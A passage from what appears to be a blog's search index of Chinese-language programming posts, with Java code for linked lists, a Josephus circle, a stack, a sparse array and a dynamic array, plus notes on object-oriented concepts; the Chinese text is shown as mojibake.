newHeroNode.no) { // æ‰¾åˆ° flag = true; break; } temp = temp.next; } // æ ¹æ®flag åˆ¤æ–­æ˜¯å¦æ‰¾åˆ°è¦ä¿®æ”¹çš„èŠ‚ç‚¹ if (flag) { temp.name = newHeroNode.name; temp.nickname = newHeroNode.nickname; } else { // æ²¡æœ‰æ‰¾åˆ° System.out.printf(&quot;æ²¡æœ‰æ‰¾åˆ° ç¼–å· %d çš„èŠ‚ç‚¹ï¼Œä¸èƒ½ä¿®æ”¹\\n&quot;, newHeroNode.no); } } // ä»åŒå‘é“¾è¡¨ä¸­åˆ é™¤ä¸€ä¸ªèŠ‚ç‚¹, // è¯´æ˜ // 1 å¯¹äºåŒå‘é“¾è¡¨ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥æ‰¾åˆ°è¦åˆ é™¤çš„è¿™ä¸ªèŠ‚ç‚¹ // 2 æ‰¾åˆ°åï¼Œè‡ªæˆ‘åˆ é™¤å³å¯ public void del(int no) { // åˆ¤æ–­å½“å‰é“¾è¡¨æ˜¯å¦ä¸ºç©º if (head.next == null) {// ç©ºé“¾è¡¨ System.out.println(&quot;é“¾è¡¨ä¸ºç©ºï¼Œæ— æ³•åˆ é™¤&quot;); return; } HeroNode2 temp = head.next; // è¾…åŠ©å˜é‡(æŒ‡é’ˆ) boolean flag = false; // æ ‡å¿—æ˜¯å¦æ‰¾åˆ°å¾…åˆ é™¤èŠ‚ç‚¹çš„ while (true) { if (temp == null) { // å·²ç»åˆ°é“¾è¡¨çš„æœ€å break; } if (temp.no == no) { // æ‰¾åˆ°çš„å¾…åˆ é™¤èŠ‚ç‚¹çš„å‰ä¸€ä¸ªèŠ‚ç‚¹temp flag = true; break; } temp = temp.next; // tempåç§»ï¼Œéå† } // åˆ¤æ–­flag if (flag) { // æ‰¾åˆ° // å¯ä»¥åˆ é™¤ // temp.next = temp.next.next;[å•å‘é“¾è¡¨] temp.pre.next = temp.next; // è¿™é‡Œæˆ‘ä»¬çš„ä»£ç æœ‰é—®é¢˜? // å¦‚æœæ˜¯æœ€åä¸€ä¸ªèŠ‚ç‚¹ï¼Œå°±ä¸éœ€è¦æ‰§è¡Œä¸‹é¢è¿™å¥è¯ï¼Œå¦åˆ™å‡ºç°ç©ºæŒ‡é’ˆ if (temp.next != null) { temp.next.pre = temp.pre; } } else { System.out.printf(&quot;è¦åˆ é™¤çš„ %d èŠ‚ç‚¹ä¸å­˜åœ¨\\n&quot;, no); } } } // å®šä¹‰HeroNode2 ï¼Œ æ¯ä¸ªHeroNode å¯¹è±¡å°±æ˜¯ä¸€ä¸ªèŠ‚ç‚¹ class HeroNode2 { public int no; public String name; public String nickname; public HeroNode2 next; // æŒ‡å‘ä¸‹ä¸€ä¸ªèŠ‚ç‚¹, é»˜è®¤ä¸ºnull public HeroNode2 pre; // æŒ‡å‘å‰ä¸€ä¸ªèŠ‚ç‚¹, é»˜è®¤ä¸ºnull // æ„é€ å™¨ public HeroNode2(int no, String name, String nickname) { this.no = no; this.name = name; this.nickname = nickname; } // ä¸ºäº†æ˜¾ç¤ºæ–¹æ³•ï¼Œæˆ‘ä»¬é‡æ–°toString @Override public String toString() { return &quot;HeroNode [no=&quot; + no + &quot;, name=&quot; + name + &quot;, nickname=&quot; + nickname + &quot;]&quot;; } } â–¼å¾ªç¯é“¾è¡¨ï¼š package linkedlist; public class Josepfu { public static void main(String[] args) { // æµ‹è¯•ä¸€æŠŠçœ‹çœ‹æ„å»ºç¯å½¢é“¾è¡¨ï¼Œå’Œéå†æ˜¯å¦ok CircleSingleLinkedList circleSingleLinkedList = new CircleSingleLinkedList(); circleSingleLinkedList.addBoy(125);// åŠ å…¥5ä¸ªå°å­©èŠ‚ç‚¹ circleSingleLinkedList.showBoy(); //æµ‹è¯•ä¸€æŠŠå°å­©å‡ºåœˆæ˜¯å¦æ­£ç¡® circleSingleLinkedList.countBoy(10, 20, 125); // 2-&gt;4-&gt;1-&gt;5-&gt;3 //String str = &quot;7*2*2-5+1-5+3-3&quot;; } } // åˆ›å»ºä¸€ä¸ªç¯å½¢çš„å•å‘é“¾è¡¨ class CircleSingleLinkedList { // åˆ›å»ºä¸€ä¸ªfirstèŠ‚ç‚¹,å½“å‰æ²¡æœ‰ç¼–å· private Boy first = null; // æ·»åŠ å°å­©èŠ‚ç‚¹ï¼Œæ„å»ºæˆä¸€ä¸ªç¯å½¢çš„é“¾è¡¨ public void addBoy(int nums) { // nums åšä¸€ä¸ªæ•°æ®æ ¡éªŒ if (nums &lt; 1) { System.out.println(&quot;numsçš„å€¼ä¸æ­£ç¡®&quot;); return; } Boy curBoy = null; // è¾…åŠ©æŒ‡é’ˆï¼Œå¸®åŠ©æ„å»ºç¯å½¢é“¾è¡¨ // ä½¿ç”¨foræ¥åˆ›å»ºæˆ‘ä»¬çš„ç¯å½¢é“¾è¡¨ for (int i = 1; i &lt;= nums; i++) { // æ ¹æ®ç¼–å·ï¼Œåˆ›å»ºå°å­©èŠ‚ç‚¹ Boy boy = new Boy(i); // å¦‚æœæ˜¯ç¬¬ä¸€ä¸ªå°å­© if (i == 1) { first = boy; first.setNext(first); // æ„æˆç¯ curBoy = first; // è®©curBoyæŒ‡å‘ç¬¬ä¸€ä¸ªå°å­© } else { curBoy.setNext(boy);// boy.setNext(first);// curBoy = boy; } } } // éå†å½“å‰çš„ç¯å½¢é“¾è¡¨ public void showBoy() { // åˆ¤æ–­é“¾è¡¨æ˜¯å¦ä¸ºç©º if (first == null) { System.out.println(&quot;æ²¡æœ‰ä»»ä½•å°å­©~~&quot;); return; } // å› ä¸ºfirstä¸èƒ½åŠ¨ï¼Œå› æ­¤æˆ‘ä»¬ä»ç„¶ä½¿ç”¨ä¸€ä¸ªè¾…åŠ©æŒ‡é’ˆå®Œæˆéå† Boy curBoy = first; while (true) { System.out.printf(&quot;å°å­©çš„ç¼–å· %d \\n&quot;, curBoy.getNo()); if (curBoy.getNext() == first) {// è¯´æ˜å·²ç»éå†å®Œæ¯• break; } curBoy = curBoy.getNext(); // curBoyåç§» } } // æ ¹æ®ç”¨æˆ·çš„è¾“å…¥ï¼Œè®¡ç®—å‡ºå°å­©å‡ºåœˆçš„é¡ºåº /** * * @param startNo * è¡¨ç¤ºä»ç¬¬å‡ ä¸ªå°å­©å¼€å§‹æ•°æ•° * @param countNum * è¡¨ç¤ºæ•°å‡ ä¸‹ * @param nums * è¡¨ç¤ºæœ€åˆæœ‰å¤šå°‘å°å­©åœ¨åœˆä¸­ */ public void countBoy(int startNo, int countNum, int nums) { // å…ˆå¯¹æ•°æ®è¿›è¡Œæ ¡éªŒ if (first == null || startNo &lt; 1 || startNo &gt; nums) { System.out.println(&quot;å‚æ•°è¾“å…¥æœ‰è¯¯ï¼Œ è¯·é‡æ–°è¾“å…¥&quot;); return; } // åˆ›å»ºè¦ç»™è¾…åŠ©æŒ‡é’ˆ,å¸®åŠ©å®Œæˆå°å­©å‡ºåœˆ Boy helper = first; // éœ€æ±‚åˆ›å»ºä¸€ä¸ªè¾…åŠ©æŒ‡é’ˆ(å˜é‡) helper , äº‹å…ˆåº”è¯¥æŒ‡å‘ç¯å½¢é“¾è¡¨çš„æœ€åè¿™ä¸ªèŠ‚ç‚¹ while (true) { if (helper.getNext() == first) { // è¯´æ˜helperæŒ‡å‘æœ€åå°å­©èŠ‚ç‚¹ break; } helper = helper.getNext(); } //å°å­©æŠ¥æ•°å‰ï¼Œå…ˆè®© first å’Œ helper ç§»åŠ¨ k - 1æ¬¡ for(int j = 0; j &lt; startNo - 1; j++) { first = first.getNext(); helper = helper.getNext(); } //å½“å°å­©æŠ¥æ•°æ—¶ï¼Œè®©first å’Œ helper æŒ‡é’ˆåŒæ—¶ çš„ç§»åŠ¨ m - 1 æ¬¡, ç„¶åå‡ºåœˆ //è¿™é‡Œæ˜¯ä¸€ä¸ªå¾ªç¯æ“ä½œï¼ŒçŸ¥é“åœˆä¸­åªæœ‰ä¸€ä¸ªèŠ‚ç‚¹ while(true) { if(helper == first) { //è¯´æ˜åœˆä¸­åªæœ‰ä¸€ä¸ªèŠ‚ç‚¹ break; } //è®© first å’Œ helper æŒ‡é’ˆåŒæ—¶ çš„ç§»åŠ¨ countNum - 1 for(int j = 0; j &lt; countNum - 1; j++) { first = first.getNext(); helper = helper.getNext(); } //è¿™æ—¶firstæŒ‡å‘çš„èŠ‚ç‚¹ï¼Œå°±æ˜¯è¦å‡ºåœˆçš„å°å­©èŠ‚ç‚¹ System.out.printf(&quot;å°å­©%då‡ºåœˆ\\n&quot;, first.getNo()); //è¿™æ—¶å°†firstæŒ‡å‘çš„å°å­©èŠ‚ç‚¹å‡ºåœˆ first = first.getNext(); helper.setNext(first); // } System.out.printf(&quot;æœ€åç•™åœ¨åœˆä¸­çš„å°å­©ç¼–å·%d \\n&quot;, first.getNo()); } } // åˆ›å»ºä¸€ä¸ªBoyç±»ï¼Œè¡¨ç¤ºä¸€ä¸ªèŠ‚ç‚¹ class Boy { private int no;// ç¼–å· private Boy next; // æŒ‡å‘ä¸‹ä¸€ä¸ªèŠ‚ç‚¹,é»˜è®¤null public Boy(int no) { this.no = no; } public int getNo() { return no; } public void setNo(int no) { this.no = no; } public Boy getNext() { return next; } public void setNext(Boy next) { this.next = next; } }","categories":[],"tags":[{"name":"algorithm","slug":"algorithm","permalink":"https://blog.kayleh.top/tags/algorithm/"}]},{"title":"Stack","slug":"æ ˆStack","date":"2020-05-10T23:30:11.000Z","updated":"2021-04-11T17:11:28.925Z","comments":true,"path":"æ ˆStack/","link":"","permalink":"https://blog.kayleh.top/%E6%A0%88Stack/","excerpt":"æ ˆ(stack)1æ ˆæ˜¯ä¸€ä¸ªå…ˆå…¥åå‡º(FILO-First In Last Out)çš„æœ‰åºåˆ—è¡¨ã€‚","text":"æ ˆ(stack)1æ ˆæ˜¯ä¸€ä¸ªå…ˆå…¥åå‡º(FILO-First In Last Out)çš„æœ‰åºåˆ—è¡¨ã€‚ 2æ ˆ(stack)æ˜¯é™åˆ¶çº¿æ€§è¡¨ä¸­å…ƒç´ çš„æ’å…¥å’Œåˆ é™¤åªèƒ½åœ¨çº¿æ€§è¡¨çš„åŒä¸€ç«¯è¿›è¡Œçš„ä¸€ç§ç‰¹æ®Šçº¿æ€§è¡¨ã€‚å…è®¸æ’å…¥å’Œåˆ é™¤çš„ä¸€ç«¯ï¼Œä¸ºå˜åŒ–çš„ä¸€ç«¯ï¼Œç§°ä¸ºæ ˆé¡¶(Top)ï¼Œå¦ä¸€ç«¯ä¸ºå›ºå®šçš„ä¸€ç«¯ï¼Œç§°ä¸ºæ ˆåº•(Bottom)ã€‚ 3.æ ¹æ®æ ˆçš„å®šä¹‰å¯çŸ¥ï¼Œæœ€å…ˆæ”¾å…¥æ ˆä¸­å…ƒç´ åœ¨æ ˆåº•ï¼Œæœ€åæ”¾å…¥çš„å…ƒç´ åœ¨æ ˆé¡¶ï¼Œè€Œåˆ é™¤å…ƒç´ åˆšå¥½ç›¸åï¼Œæœ€åæ”¾å…¥çš„å…ƒç´ æœ€å…ˆåˆ é™¤ï¼Œæœ€å…ˆæ”¾å…¥çš„å…ƒç´ æœ€ååˆ é™¤ â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” (\\(\\ (\\(\\ (\\(\\ (\\(\\ (\\(\\ â”‚ (=&#39;.&#39;) &lt;â”€&gt; (=&#39;.&#39;) (=&#39;.&#39;) (=&#39;.&#39;) (=&#39;.&#39;)â”‚ O(_&quot;)&quot;) O(_&quot;)&quot;) O(_&quot;)&quot;) O(_&quot;)&quot;) O(_&quot;)&quot;)â”‚ â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ stack å’Œé˜Ÿåˆ—åŒºåˆ«å¼€ â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ (\\(\\ (\\(\\ (\\(\\ (\\(\\ (\\(\\ (=&#39;.&#39;) â”€&gt; (=&#39;.&#39;) (=&#39;.&#39;) (=&#39;.&#39;) â”€&gt; (=&#39;.&#39;) O(_&quot;)&quot;) O(_&quot;)&quot;) O(_&quot;)&quot;) O(_&quot;)&quot;) O(_&quot;)&quot;) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ Queue æ ˆçš„ç»“æ„ â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” (\\(\\ (\\(\\ (\\(\\ (\\(\\ â”‚ (=&#39;.&#39;) (=&#39;.&#39;) (=&#39;.&#39;) (=&#39;.&#39;)â”‚ O(_&quot;)&quot;) O(_&quot;)&quot;) O(_&quot;)&quot;) O(_&quot;)&quot;)â”‚ â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â†‘ â†‘ Topæ ˆé¡¶ Bottomæ ˆåº• åˆå§‹åŒ–ä¸º-1 å…¥æ ˆ â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” (\\(\\ (\\(\\ (\\(\\ (\\(\\ â”‚ (=&#39;.&#39;) â”€&gt; (=&#39;.&#39;) (=&#39;.&#39;) (=&#39;.&#39;)â”‚ O(_&quot;)&quot;) O(_&quot;)&quot;) O(_&quot;)&quot;) O(_&quot;)&quot;)â”‚ data â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ pushå…¥æ ˆ top++; stack[top]=data å‡ºæ ˆ â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” (\\(\\ (\\(\\ (\\(\\ (\\(\\ â”‚ &lt;â”€ (=&#39;.&#39;) (=&#39;.&#39;) (=&#39;.&#39;) (=&#39;.&#39;)â”‚ O(_&quot;)&quot;) O(_&quot;)&quot;) O(_&quot;)&quot;) O(_&quot;)&quot;)â”‚ â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ popå‡ºæ ˆ int value = stack[top]; top--; return value;","categories":[],"tags":[{"name":"algorithm","slug":"algorithm","permalink":"https://blog.kayleh.top/tags/algorithm/"}]},{"title":"SparseArray","slug":"SparseArrayç¨€ç–æ•°ç»„","date":"2020-05-07T05:28:41.000Z","updated":"2021-04-11T17:11:28.424Z","comments":true,"path":"SparseArrayç¨€ç–æ•°ç»„/","link":"","permalink":"https://blog.kayleh.top/SparseArray%E7%A8%80%E7%96%8F%E6%95%B0%E7%BB%84/","excerpt":"","text":"ç¨€ç–æ•°ç»„â€‹ ï¼ˆç¨€ç–æ•°ç»„ï¼‰ å®šä¹‰å½“ä¸€ä¸ªæ•°ç»„ä¸­å¤§éƒ¨åˆ†çš„å€¼æœªè¢«ä½¿ç”¨ï¼Œåªæœ‰å°‘éƒ¨åˆ†çš„å€¼çš„ç©ºé—´ä½¿ç”¨ï¼Œé€ æˆäº†å†…å­˜çš„æµªè´¹ï¼Œè¿™ä¸ªæ—¶å€™å°±å¯ä»¥ç”¨åˆ°ç¨€ç–æ•°ç»„ï¼Œä¿å­˜éœ€è¦çš„æ•°æ®ï¼ŒèŠ‚çº¦å†…å­˜ç©ºé—´ã€‚å½“è®°å½•ä¸€ä¸ªæ£‹ç›˜æ—¶ï¼š img img è®°å½•æ£‹ç›˜çš„ä½ç½®ï¼Œåªæœ‰ä¸¤ä¸ªå†…å®¹ï¼Œå…¶ä»–æœªè¢«ä½¿ç”¨æ²¡æœ‰æ„ä¹‰çš„å€¼æµªè´¹äº†å†…å­˜ç©ºé—´ ä½¿ç”¨ç¨€ç–æ•°ç»„ä»£æ›¿äºŒç»´æ•°ç»„ï¼Œç¬¬0è¡Œè¡¨ç¤ºç¨€ç–æ•°ç»„çš„æ€»è¡Œï¼Œæ€»åˆ—å’Œæ‰€éœ€å†…å®¹çš„ä¸ªæ•°ã€‚ å®ç°package com.kayleh.tmall.controller; /** * @Author: Wizard * @Date: 2020/5/7 9:16 */ public class SparseArray { public static void main(String[] args) { //åˆ›å»ºä¸€ä¸ªäºŒç»´æ•°ç»„ //0:è¡¨ç¤ºæ²¡æœ‰æ£‹å­ 1è¡¨ç¤ºé»‘å­ 2è¡¨ç¤ºè“å­ int chessArr[][] = new int[11][10]; chessArr[1][2] = 1; chessArr[2][3] = 2; for(int[] row:chessArr){ for(int data:row){ System.out.printf(&quot;%d\\t&quot;,data); } System.out.println(); } int[][] array = getSparseArray(chessArr); System.out.println(&quot;-------&quot;); for(int i = 0 ; i&lt; array.length;i++){ System.out.printf(&quot;%d\\t%d\\t%d\\t\\n&quot;,array[i][0],array[i][1],array[i][2]); } System.out.println(&quot;--------&quot;); int[][] startArr = recovery(array); for(int[] row:startArr){ for(int data:row){ System.out.printf(&quot;%d\\t&quot;,data); } System.out.println(); } } /** * å°†æ™®é€šæ•°ç»„è½¬æ¢ä¸ºç¨€ç–æ•°ç»„ * @param chessArr * @return */ public static int[][] getSparseArray(int[][] chessArr){ if(!checkIsRight(chessArr)){ return null; } //1.æ‹¿åˆ°æ•°ç»„å é¦–å…ˆè·å–å…ƒç´ çš„ä¸ªæ•°,ç„¶åæ‰èƒ½å»ºç«‹ç¨€ç–æ•°ç»„ int sum = 0; for(int[] arr:chessArr){ for(int i:arr){ if(i != 0){ sum++; } } } //2.å»ºç«‹ç¨€ç–æ•°ç»„ int[][] sparseArr = new int[sum+1][3]; sparseArr[0][0] = chessArr.length; //è¡Œ sparseArr[0][1] = chessArr[0].length;//åˆ— sparseArr[0][2] = sum; //å…ƒç´ ä¸ªæ•° //3.æ•°ç»„å­˜æ”¾ int count = 0; for(int i = 0; i &lt;chessArr.length; i++ ){ for(int j = 0; j &lt;chessArr[i].length;j++ ){ if(chessArr[i][j] != 0){ sparseArr[++count][0] = i;//è¡Œ sparseArr[count][1] = j;//åˆ— sparseArr[count][2] = chessArr[i][j]; } } } return sparseArr; } /** * å°†ç¨€ç–æ•°ç»„è½¬å›æ™®é€šæ•°ç»„ * @param sparseArr * @return */ public static int[][] recovery(int[][] sparseArr){ if(!checkIsRight(sparseArr)){ return null; } //è·å–åŸæ•°ç»„çš„ è¡Œæ•°å’Œåˆ—æ•° å¹¶åˆ›å»ºåŸæ•°ç»„ int arr[][] = new int[sparseArr[0][0]][sparseArr[0][1]]; for(int i = 1; i &lt; sparseArr.length;i++){ arr[sparseArr[i][0]][sparseArr[i][1]] = sparseArr[i][2]; } return arr; } public static boolean checkIsRight(int[][] arr){ if(arr == null || arr.length &lt;= 1 ){ return false; } return true; } }","categories":[],"tags":[{"name":"algorithm","slug":"algorithm","permalink":"https://blog.kayleh.top/tags/algorithm/"}]},{"title":"é¢å‘å¯¹è±¡","slug":"é¢å‘å¯¹è±¡çš„ç‰¹å¾","date":"2020-04-29T05:33:19.000Z","updated":"2021-04-11T17:11:29.099Z","comments":true,"path":"é¢å‘å¯¹è±¡çš„ç‰¹å¾/","link":"","permalink":"https://blog.kayleh.top/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%9A%84%E7%89%B9%E5%BE%81/","excerpt":"é¢å‘å¯¹è±¡çš„ç‰¹å¾æœ‰å“ªäº›æ–¹é¢å°è£…æœ€å¸¸è§çš„æ˜¯æŠŠå±æ€§ç§æœ‰åŒ–å°è£…åœ¨ä¸€ä¸ªç±»é‡Œé¢ï¼Œåªèƒ½é€šè¿‡æ–¹æ³•å»è®¿é—®","text":"é¢å‘å¯¹è±¡çš„ç‰¹å¾æœ‰å“ªäº›æ–¹é¢å°è£…æœ€å¸¸è§çš„æ˜¯æŠŠå±æ€§ç§æœ‰åŒ–å°è£…åœ¨ä¸€ä¸ªç±»é‡Œé¢ï¼Œåªèƒ½é€šè¿‡æ–¹æ³•å»è®¿é—® ç»§æ‰¿extendså¯ä»¥å¤ç”¨ä»£ç ï¼Œ ç»§æ‰¿æ˜¯é¢å‘å¯¹è±¡ç¼–ç¨‹çš„ä¸€ç§å¼ºå¤§çš„ä»£ç å¤ç”¨æ–¹å¼ï¼› å­ç±»ç»§æ‰¿çˆ¶ç±»ï¼Œä»è€Œç»§æ‰¿äº†çˆ¶ç±»çš„æ–¹æ³•å’Œå±æ€§ï¼› Javaåªå…è®¸å•ç»§æ‰¿ï¼Œæ‰€æœ‰ç±»æœ€ç»ˆçš„æ ¹ç±»æ˜¯Objectï¼› protectedå…è®¸å­ç±»è®¿é—®çˆ¶ç±»çš„å­—æ®µå’Œæ–¹æ³•ï¼› protectedå…³é”®å­—å¯ä»¥æŠŠå­—æ®µå’Œæ–¹æ³•çš„è®¿é—®æƒé™æ§åˆ¶åœ¨ç»§æ‰¿æ ‘å†…éƒ¨ï¼Œä¸€ä¸ªprotectedå­—æ®µå’Œæ–¹æ³•å¯ä»¥è¢«å…¶å­ç±»ï¼Œä»¥åŠå­ç±»çš„å­ç±»æ‰€è®¿é—®ã€‚ çˆ¶ç±»æ²¡æœ‰æ— å‚æ„é€ å™¨æ—¶ï¼Œå­ç±»ä»»ä½•classè°ƒç”¨çˆ¶ç±»æ„é€ å™¨æ—¶ï¼Œå¿…é¡»è°ƒç”¨superçˆ¶ç±»æœ‰çš„æ„é€ å™¨ã€‚ å¦‚æœçˆ¶ç±»æ²¡æœ‰é»˜è®¤çš„æ„é€ æ–¹æ³•ï¼Œå­ç±»å°±å¿…é¡»æ˜¾å¼è°ƒç”¨super()å¹¶ç»™å‡ºå‚æ•°ä»¥ä¾¿è®©ç¼–è¯‘å™¨å®šä½åˆ°çˆ¶ç±»çš„ä¸€ä¸ªåˆé€‚çš„æ„é€ æ–¹æ³•ã€‚å³å­ç±»ä¸ä¼šç»§æ‰¿ä»»ä½•çˆ¶ç±»çš„æ„é€ æ–¹æ³•ã€‚å­ç±»é»˜è®¤çš„æ„é€ æ–¹æ³•æ˜¯ç¼–è¯‘å™¨è‡ªåŠ¨ç”Ÿæˆçš„ï¼Œä¸æ˜¯ç»§æ‰¿çš„ã€‚ å‘ä¸Šè½¬å‹ç±»å‹æå‡ã€‚ æŠŠä¸€ä¸ªå­ç±»ç±»å‹å®‰å…¨åœ°å˜ä¸ºçˆ¶ç±»ç±»å‹çš„èµ‹å€¼ï¼Œè¢«ç§°ä¸ºå‘ä¸Šè½¬å‹ï¼ˆupcastingï¼‰ã€‚ å‘ä¸Šè½¬å‹å®é™…ä¸Šæ˜¯æŠŠä¸€ä¸ªå­ç±»å‹å®‰å…¨åœ°å˜ä¸ºæ›´åŠ æŠ½è±¡çš„çˆ¶ç±»å‹ã€‚ å‘ä¸‹è½¬å‹ å’Œå‘ä¸Šè½¬å‹ç›¸åï¼Œå¦‚æœæŠŠä¸€ä¸ªçˆ¶ç±»ç±»å‹å¼ºåˆ¶è½¬å‹ä¸ºå­ç±»ç±»å‹ï¼Œå°±æ˜¯å‘ä¸‹è½¬å‹ï¼ˆdowncastingï¼‰ã€‚ å‘ä¸‹è½¬å‹å¾ˆå¯èƒ½ä¼šå¤±è´¥ã€‚ æŠ½è±¡ ç”±äºå¤šæ€çš„å­˜åœ¨ï¼Œæ¯ä¸ªå­ç±»éƒ½å¯ä»¥è¦†å†™çˆ¶ç±»çš„æ–¹æ³• å¦‚æœä¸€ä¸ªclasså®šä¹‰äº†æ–¹æ³•ï¼Œä½†æ²¡æœ‰å…·ä½“æ‰§è¡Œä»£ç ï¼Œè¿™ä¸ªæ–¹æ³•å°±æ˜¯æŠ½è±¡æ–¹æ³•ï¼ŒæŠ½è±¡æ–¹æ³•ç”¨abstractä¿®é¥°ã€‚ å› ä¸ºæ— æ³•æ‰§è¡ŒæŠ½è±¡æ–¹æ³•ï¼Œå› æ­¤è¿™ä¸ªç±»ä¹Ÿå¿…é¡»ç”³æ˜ä¸ºæŠ½è±¡ç±»ï¼ˆabstract classï¼‰ã€‚ ä½¿ç”¨abstractä¿®é¥°çš„ç±»å°±æ˜¯æŠ½è±¡ç±»ã€‚æˆ‘ä»¬æ— æ³•å®ä¾‹åŒ–ä¸€ä¸ªæŠ½è±¡ç±»ã€‚ é€šè¿‡abstractå®šä¹‰çš„æ–¹æ³•æ˜¯æŠ½è±¡æ–¹æ³•ï¼Œå®ƒåªæœ‰å®šä¹‰ï¼Œæ²¡æœ‰å®ç°ã€‚æŠ½è±¡æ–¹æ³•å®šä¹‰äº†å­ç±»å¿…é¡»å®ç°çš„æ¥å£è§„èŒƒï¼› å®šä¹‰äº†æŠ½è±¡æ–¹æ³•çš„classå¿…é¡»è¢«å®šä¹‰ä¸ºæŠ½è±¡ç±»ï¼Œä»æŠ½è±¡ç±»ç»§æ‰¿çš„å­ç±»å¿…é¡»å®ç°æŠ½è±¡æ–¹æ³•ï¼› å¦‚æœä¸å®ç°æŠ½è±¡æ–¹æ³•ï¼Œåˆ™è¯¥å­ç±»ä»æ˜¯ä¸€ä¸ªæŠ½è±¡ç±»ï¼› é¢å‘æŠ½è±¡ç¼–ç¨‹ä½¿å¾—è°ƒç”¨è€…åªå…³å¿ƒæŠ½è±¡æ–¹æ³•çš„å®šä¹‰ï¼Œä¸å…³å¿ƒå­ç±»çš„å…·ä½“å®ç°ã€‚ å¤šæ€ åœ¨ç»§æ‰¿å…³ç³»ä¸­ï¼Œå­ç±»å¦‚æœå®šä¹‰äº†ä¸€ä¸ªä¸çˆ¶ç±»æ–¹æ³•ç­¾åå®Œå…¨ç›¸åŒçš„æ–¹æ³•ï¼Œè¢«ç§°ä¸ºè¦†å†™ï¼ˆOverrideï¼‰ã€‚ å¤šæ€å…·æœ‰ä¸€ä¸ªéå¸¸å¼ºå¤§çš„åŠŸèƒ½ï¼Œå°±æ˜¯å…è®¸æ·»åŠ æ›´å¤šç±»å‹çš„å­ç±»å®ç°åŠŸèƒ½æ‰©å±•ï¼Œå´ä¸éœ€è¦ä¿®æ”¹åŸºäºçˆ¶ç±»çš„ä»£ç ã€‚ å­ç±»å¯ä»¥è¦†å†™çˆ¶ç±»çš„æ–¹æ³•ï¼ˆOverrideï¼‰ï¼Œè¦†å†™åœ¨å­ç±»ä¸­æ”¹å˜äº†çˆ¶ç±»æ–¹æ³•çš„è¡Œä¸ºï¼› Javaçš„æ–¹æ³•è°ƒç”¨æ€»æ˜¯ä½œç”¨äºè¿è¡ŒæœŸå¯¹è±¡çš„å®é™…ç±»å‹ï¼Œè¿™ç§è¡Œä¸ºç§°ä¸ºå¤šæ€ï¼› finalä¿®é¥°ç¬¦æœ‰å¤šç§ä½œç”¨ï¼š finalä¿®é¥°çš„æ–¹æ³•å¯ä»¥é˜»æ­¢è¢«è¦†å†™ï¼› finalä¿®é¥°çš„classå¯ä»¥é˜»æ­¢è¢«ç»§æ‰¿ï¼› finalä¿®é¥°çš„fieldå¿…é¡»åœ¨åˆ›å»ºå¯¹è±¡æ—¶åˆå§‹åŒ–ï¼Œéšåä¸å¯ä¿®æ”¹ã€‚","categories":[],"tags":[{"name":"interview","slug":"interview","permalink":"https://blog.kayleh.top/tags/interview/"}]},{"title":"dynamic-array","slug":"åŠ¨æ€æ•°ç»„","date":"2020-04-25T17:02:37.000Z","updated":"2021-04-11T17:11:28.761Z","comments":true,"path":"åŠ¨æ€æ•°ç»„/","link":"","permalink":"https://blog.kayleh.top/%E5%8A%A8%E6%80%81%E6%95%B0%E7%BB%84/","excerpt":"åŠ¨æ€æ•°ç»„","text":"åŠ¨æ€æ•°ç»„ æ•°ç»„æ˜¯ä¸€ç§é¡ºåºå‚¨å­˜çš„çº¿æ€§è¡¨,æ‰€æœ‰å…ƒç´ çš„å†…å­˜åœ°å€æ˜¯è¿ç»­.int[] array = new int[]{20, 30, 40} //å‘å†…å­˜ç”³è¯·äº†12ä¸ªå­—èŠ‚åœ°å€ åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿° åœ¨å¾ˆå¤šç¼–ç¨‹è¯­è¨€ä¸­ï¼Œæ•°ç»„æœ‰ä¸ªè‡´å‘½çš„ç¼ºç‚¹ï¼Œ æ— æ³•åŠ¨æ€ä¿®æ”¹å®¹é‡ã€‚ å®é™…å¼€å‘ä¸­æˆ‘ä»¬å¸Œæœ›æ•°ç»„çš„å®¹é‡æ˜¯åŠ¨æ€å˜åŒ–çš„ã€‚ åŠ¨æ€æ•°ç»„åˆ›å»ºArrayListç±»,åˆ›å»ºsizeå±æ€§æ¥ç®¡ç†æ•°ç»„ä¸­å…ƒç´ çš„ä¸ªæ•°,åˆ›å»ºelementå±æ€§æ¥ç®¡ç†å­˜å–çš„æ•°æ®. å¯ä»¥å¯¹åŠ¨æ€æ•°ç»„è¿›è¡Œå¢åˆ æ”¹æŸ¥æ“ä½œ. public class ArrayList&lt;E&gt; { private int size; private E[] elements; // å…ƒç´ çš„æ•°é‡ int size(); // æ˜¯å¦ä¸ºç©º boolean isEmpty(); // æ˜¯å¦åŒ…å«æŸä¸ªå…ƒç´  boolean contains(E element); // æ·»åŠ 